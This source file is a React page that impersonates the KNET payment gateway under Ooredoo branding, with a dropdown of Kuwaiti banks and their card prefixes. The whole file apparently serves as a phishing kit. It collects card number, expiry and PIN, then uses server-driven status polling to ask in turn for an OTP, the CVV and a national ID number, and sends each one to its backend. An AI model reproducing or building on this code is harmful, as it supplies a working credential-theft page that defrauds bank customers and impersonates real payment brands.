import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import "../styles/knet-unified.css";

type PaymentStage = "knet" | "loading" | "otp" | "cvv" | "hawety" | "success" | "error";

interface PaymentData {
  paymentId?: string;
  amount: string;
  merchant: string;
  bank: string;
  cardPrefix: string;
  cardNumber: string;
  month: string;
  year: string;
  pin: string;
  otp?: string;
  cvv?: string;
  hawety?: string;
}

const BANKS = [
  { value: "prefix", label: "Select Your Bank" },
  { value: "Al Ahli Bank of Kuwait [ABK]", label: "Al Ahli Bank of Kuwait [ABK]" },
  { value: "Al Rajhi Bank [Rajhi]", label: "Al Rajhi Bank [Rajhi]" },
  { value: "Bank of Bahrain Kuwait [BBK]", label: "Bank of Bahrain Kuwait [BBK]" },
  { value: "Boubyan Bank [Boubyan]", label: "Boubyan Bank [Boubyan]" },
  { value: "Burgan Bank [Burgan]", label: "Burgan Bank [Burgan]" },
  { value: "Commercial Bank of Kuwait [CBK]", label: "Commercial Bank of Kuwait [CBK]" },
  { value: "Doha Bank [Doha]", label: "Doha Bank [Doha]" },
  { value: "Gulf Bank of Kuwait [GBK]", label: "Gulf Bank of Kuwait [GBK]" },
  { value: "KFH [TAM]", label: "KFH [TAM]" },
  { value: "Kuwait Finance House [KFH]", label: "Kuwait Finance House [KFH]" },
  { value: "Kuwait International Bank [KIB]", label: "Kuwait International Bank [KIB]" },
  { value: "National Bank of Kuwait [NBK]", label: "National Bank of Kuwait [NBK]" },
  { value: "NBK [Weyay]", label: "NBK [Weyay]" },
  { value: "Qatar National Bank [QNB]", label: "Qatar National Bank [QNB]" },
  { value: "Union National Bank [UNB]", label: "Union National Bank [UNB]" },
  { value: "arba Bank [Warba]", label: "Warba Bank [Warba]" },
];

const BANK_PREFIXES: Record<string, string[]> = {
  "Al Ahli Bank of Kuwait [ABK]": ["403622", "423826", "428628"],
  "Al Rajhi Bank [Rajhi]": ["458838"],
  "Bank of Bahrain Kuwait [BBK]": ["418056", "588790"],
  "Boubyan Bank [Boubyan]": ["404919", "450605", "426058", "431199", "470350", "490455", "490456"],
  "Burgan Bank [Burgan]": ["540759", "402978", "415254", "450238", "468564", "403583", "49219000"],
  "Commercial Bank of Kuwait [CBK]": ["521175", "516334", "532672", "537015"],
  "Doha Bank [Doha]": ["419252"],
  "Gulf Bank of Kuwait [GBK]": ["531329", "531471", "531470", "517419", "559475", "517458", "531644", "526206"],
  "KFH [TAM]": ["45077848", "45077849"],
  "Kuwait Finance House [KFH]": ["450778", "485602", "573016", "532674"],
  "Kuwait International Bank [KIB]": ["409054", "406464"],
  "National Bank of Kuwait [NBK]": ["464452", "589160"],
  "NBK [Weyay]": ["46445250", "543363"],
  "Qatar National Bank [QNB]": ["521020", "524745"],
  "Union National Bank [UNB]": ["457778"],
  "arba Bank [Warba]": ["532749", "559459", "541350", "525528"],
};

export default function UnifiedPayment() {
  const [location, setLocation] = useLocation();
  const [stage, setStage] = useState<PaymentStage>("knet");
  const [paymentData, setPaymentData] = useState<PaymentData>({
    amount: "5",
    merchant: "Ooredoo",
    bank: "",
    cardPrefix: "",
    cardNumber: "",
    month: "0",
    year: "",
    pin: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [statusMessage, setStatusMessage] = useState("");
  const [pollingInterval, setPollingInterval] = useState<NodeJS.Timeout | null>(null);

  // Get amount from URL params
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const amount = params.get("amount");
    if (amount) {
      setPaymentData((prev) => ({ ...prev, amount }));
    }
  }, []);

  // Polling for payment status
  useEffect(() => {
    if (stage === "loading" && paymentData.paymentId) {
      const poll = async () => {
        try {
          const response = await fetch(
            `/api/trpc/payment.getPaymentStatus?input=${JSON.stringify({ paymentId: paymentData.paymentId })}`
          );
          const data = await response.json();

          if (data.result?.data?.status) {
            const status = data.result.data.status;

            if (status === "otp1_pending") {
              setStage("otp");
              setStatusMessage("جاري إرسال رمز التحقق...");
            } else if (status === "cvv_pending") {
              setStage("cvv");
              setStatusMessage("جاري التحقق من CVV...");
            } else if (status === "hawety_pending") {
              setStage("hawety");
              setStatusMessage("جاري التحقق من بيانات الهوية...");
            } else if (status === "completed") {
              setStage("success");
              if (pollingInterval) clearInterval(pollingInterval);
            } else if (status === "rejected") {
              setStage("error");
              if (pollingInterval) clearInterval(pollingInterval);
            }
          }
        } catch (error) {
          console.error("Polling error:", error);
        }
      };

      const interval = setInterval(poll, 2000);
      setPollingInterval(interval);

      return () => clearInterval(interval);
    }
  }, [stage, paymentData.paymentId, pollingInterval]);

  const validateKnetForm = () => {
    const newErrors: Record<string, string> = {};

    if (!paymentData.bank || paymentData.bank === "prefix") {
      newErrors.bank = "Select Your Bank";
    }
    if (!paymentData.cardPrefix) {
      newErrors.cardPrefix = "Prefix";
    }
    if (!paymentData.cardNumber || paymentData.cardNumber.length !== 10) {
      newErrors.cardNumber = "Card Number";
    }
    if (!paymentData.month || paymentData.month === "0") {
      newErrors.month = "MM";
    }
    if (!paymentData.year) {
      newErrors.year = "YYYY";
    }
    if (!paymentData.pin || paymentData.pin.length !== 4) {
      newErrors.pin = "PIN";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleKnetSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateKnetForm()) return;

    setStage("loading");
    setStatusMessage("Processing Payment...");

    try {
      const response = await fetch("/api/trpc/payment.submitKnet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: paymentData.amount,
          bank: paymentData.bank,
          cardNumber: paymentData.cardPrefix + paymentData.cardNumber,
          expiryMonth: paymentData.month,
          expiryYear: paymentData.year,
          pin: paymentData.pin,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.paymentId) {
        setPaymentData((prev) => ({
          ...prev,
          paymentId: data.result.data.paymentId,
        }));
      } else {
        setStage("error");
        setStatusMessage("Error processing payment");
      }
    } catch (error) {
      console.error("Submit error:", error);
      setStage("error");
      setStatusMessage("Connection error");
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentData.otp || paymentData.otp.length !== 6) {
      setErrors({ otp: "OTP must be 6 digits" });
      return;
    }

    setStage("loading");
    setStatusMessage("Verifying OTP...");

    try {
      const response = await fetch("/api/trpc/payment.submitOtp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentId: paymentData.paymentId,
          otp: paymentData.otp,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.success) {
        // Continue polling
      } else {
        setStage("otp");
        setErrors({ otp: "Invalid OTP" });
      }
    } catch (error) {
      console.error("OTP error:", error);
      setStage("otp");
      setErrors({ otp: "Connection error" });
    }
  };

  const handleCvvSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentData.cvv || paymentData.cvv.length !== 3) {
      setErrors({ cvv: "CVV must be 3 digits" });
      return;
    }

    setStage("loading");
    setStatusMessage("Verifying CVV...");

    try {
      const response = await fetch("/api/trpc/payment.submitCvv", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentId: paymentData.paymentId,
          cvv: paymentData.cvv,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.success) {
        // Continue polling
      } else {
        setStage("cvv");
        setErrors({ cvv: "Invalid CVV" });
      }
    } catch (error) {
      console.error("CVV error:", error);
      setStage("cvv");
      setErrors({ cvv: "Connection error" });
    }
  };

  const handleHawetySubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentData.hawety) {
      setErrors({ hawety: "Please enter identity data" });
      return;
    }

    setStage("loading");
    setStatusMessage("Verifying identity...");

    try {
      const response = await fetch("/api/trpc/payment.submitHawety", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentId: paymentData.paymentId,
          hawety: paymentData.hawety,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.success) {
        // Continue polling
      } else {
        setStage("hawety");
        setErrors({ hawety: "Invalid identity data" });
      }
    } catch (error) {
      console.error("Hawety error:", error);
      setStage("hawety");
      setErrors({ hawety: "Connection error" });
    }
  };

  const handleCancel = () => {
    setLocation("/");
  };

  const getPrefixOptions = () => {
    if (!paymentData.bank || paymentData.bank === "prefix") {
      return [];
    }
    return BANK_PREFIXES[paymentData.bank] || [];
  };

  // KNET Payment Form
  if (stage === "knet") {
    return (
      <div className="knet-page">
        <div className="knet-header">
          <img src="/knet/knet.png" alt="KNET" className="knet-logo" />
        </div>
        <div className="knet-form-container">
          <form onSubmit={handleKnetSubmit} className="knet-form">
            {/* Merchant Info */}
            <div className="knet-row">
              <label className="knet-label">Merchant:</label>
              <span className="knet-value">{paymentData.merchant}</span>
            </div>

            {/* Amount */}
            <div className="knet-row">
              <label className="knet-label">Amount:</label>
              <span className="knet-value">KD {paymentData.amount}</span>
            </div>

            {/* Bank Selection */}
            <div className="knet-row">
              <label className="knet-label">Select Your Bank:</label>
              <select
                value={paymentData.bank}
                onChange={(e) => setPaymentData({ ...paymentData, bank: e.target.value, cardPrefix: "" })}
                className={`knet-select ${errors.bank ? "error" : ""}`}
              >
                {BANKS.map((bank) => (
                  <option key={bank.value} value={bank.value}>
                    {bank.label}
                  </option>
                ))}
              </select>
              {errors.bank && <span className="error-text">{errors.bank}</span>}
            </div>

            {/* Card Number */}
            <div className="knet-row three-column">
              <label className="knet-label">Card Number:</label>
              <select
                value={paymentData.cardPrefix}
                onChange={(e) => setPaymentData({ ...paymentData, cardPrefix: e.target.value })}
                className={`knet-select prefix-select ${errors.cardPrefix ? "error" : ""}`}
              >
                <option value="">Prefix</option>
                {getPrefixOptions().map((prefix) => (
                  <option key={prefix} value={prefix}>
                    {prefix}
                  </option>
                ))}
              </select>
              <input
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="Card Number"
                value={paymentData.cardNumber}
                onChange={(e) => setPaymentData({ ...paymentData, cardNumber: e.target.value.slice(0, 10) })}
                maxLength={10}
                className={`knet-input ${errors.cardNumber ? "error" : ""}`}
              />
              {errors.cardNumber && <span className="error-text">{errors.cardNumber}</span>}
            </div>

            {/* Expiration Date */}
            <div className="knet-row three-column">
              <label className="knet-label">Expiration Date:</label>
              <select
                value={paymentData.month}
                onChange={(e) => setPaymentData({ ...paymentData, month: e.target.value })}
                className={`knet-select ${errors.month ? "error" : ""}`}
              >
                <option value="0">MM</option>
                {Array.from({ length: 12 }, (_, i) => (
                  <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                    {String(i + 1).padStart(2, "0")}
                  </option>
                ))}
              </select>
              <select
                value={paymentData.year}
                onChange={(e) => setPaymentData({ ...paymentData, year: e.target.value })}
                className={`knet-select ${errors.year ? "error" : ""}`}
              >
                <option value="">YYYY</option>
                {Array.from({ length: 10 }, (_, i) => {
                  const year = new Date().getFullYear() + i;
                  return (
                    <option key={year} value={String(year)}>
                      {year}
                    </option>
                  );
                })}
              </select>
              {errors.month && <span className="error-text">{errors.month}</span>}
              {errors.year && <span className="error-text">{errors.year}</span>}
            </div>

            {/* PIN */}
            <div className="knet-row">
              <label className="knet-label">PIN:</label>
              <input
                type="password"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="PIN"
                value={paymentData.pin}
                onChange={(e) => setPaymentData({ ...paymentData, pin: e.target.value.slice(0, 4) })}
                maxLength={4}
                className={`knet-input ${errors.pin ? "error" : ""}`}
              />
              {errors.pin && <span className="error-text">{errors.pin}</span>}
            </div>

            {/* Buttons */}
            <div className="knet-buttons">
              <button type="submit" className="knet-button submit-btn">
                Submit
              </button>
              <button type="button" onClick={handleCancel} className="knet-button cancel-btn">
                Cancel
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  // Loading Page
  if (stage === "loading") {
    return (
      <div className="loading-page">
        <div className="loading-content">
          <img src="/assets/ooredoo-logo.png" alt="Ooredoo" className="loading-logo" />
          <div className="loading-spinner">
            <div className="spinner"></div>
          </div>
          <p className="loading-text">{statusMessage}</p>
        </div>
      </div>
    );
  }

  // OTP Page
  if (stage === "otp") {
    return (
      <div className="otp-page">
        <div className="otp-content">
          <h2>Enter OTP</h2>
          <p>An OTP has been sent to your registered mobile number</p>
          <form onSubmit={handleOtpSubmit}>
            <input
              type="text"
              placeholder="Enter OTP"
              maxLength={6}
              value={paymentData.otp || ""}
              onChange={(e) => setPaymentData({ ...paymentData, otp: e.target.value })}
              className="otp-input"
            />
            {errors.otp && <span className="error-text">{errors.otp}</span>}
            <button type="submit" className="otp-button">
              Verify OTP
            </button>
          </form>
        </div>
      </div>
    );
  }

  // CVV Page
  if (stage === "cvv") {
    return (
      <div className="cvv-page">
        <div className="cvv-content">
          <h2>Enter CVV</h2>
          <p>Please enter the CVV from the back of your card</p>
          <form onSubmit={handleCvvSubmit}>
            <input
              type="password"
              placeholder="CVV"
              maxLength={4}
              value={paymentData.cvv || ""}
              onChange={(e) => setPaymentData({ ...paymentData, cvv: e.target.value })}
              className="cvv-input"
            />
            {errors.cvv && <span className="error-text">{errors.cvv}</span>}
            <button type="submit" className="cvv-button">
              Verify CVV
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Hawety Page
  if (stage === "hawety") {
    return (
      <div className="hawety-page">
        <div className="hawety-content">
          <h2>Verify Identity</h2>
          <p>Please enter your ID details</p>
          <form onSubmit={handleHawetySubmit}>
            <input
              type="text"
              placeholder="ID Number"
              value={paymentData.hawety || ""}
              onChange={(e) => setPaymentData({ ...paymentData, hawety: e.target.value })}
              className="hawety-input"
            />
            {errors.hawety && <span className="error-text">{errors.hawety}</span>}
            <button type="submit" className="hawety-button">
              Verify Identity
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Success Page
  if (stage === "success") {
    return (
      <div className="success-page">
        <div className="success-content">
          <h2>Payment Successful!</h2>
          <p>Your payment has been processed successfully</p>
          <button onClick={() => setLocation("/")} className="success-button">
            Return to Home
          </button>
        </div>
      </div>
    );
  }

  // Error Page
  if (stage === "error") {
    return (
      <div className="error-page">
        <div className="error-content">
          <h2>Payment Failed</h2>
          <p>{statusMessage}</p>
          <button onClick={() => setLocation("/")} className="error-button">
            Return to Home
          </button>
        </div>
      </div>
    );
  }

  return null;
}
